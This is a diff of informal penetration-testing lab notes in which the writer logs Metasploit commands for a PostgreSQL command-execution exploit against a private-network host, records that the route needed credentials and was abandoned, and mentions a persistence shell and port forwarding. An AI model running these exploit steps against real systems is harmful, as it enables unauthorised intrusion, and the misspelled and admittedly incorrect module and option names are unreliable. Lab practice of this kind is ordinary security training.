@@ -25,23 +25,19 @@ use exploit modules as much as possible.
 LHOST comming back through our WAN
 
 
-[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]
 
-
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options
-
+[[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
+this will be for the report that enumeration was a dead end
+(ATK)(msf6) exploit(this is not the actual name of the module would need to go back) > show options
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
-
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [1:55] [DAY 11]
 
+[[[[[[HARD STOP found out that you need creds for this route]]]]]]
 
-[HARD STOP found out that you need creds for this route ]
+
 
 Config start around [1:48] [DAY 11]
 
@@ -83,3 +79,4 @@ catch user persistence shell ON VIC2 [[14:02]]DAY 12
 
 set up another port fowarding rule with this port number because thats where the websever is.
 
+(type in web browser) 127.0.0.1:8000 [use ip thats local to you
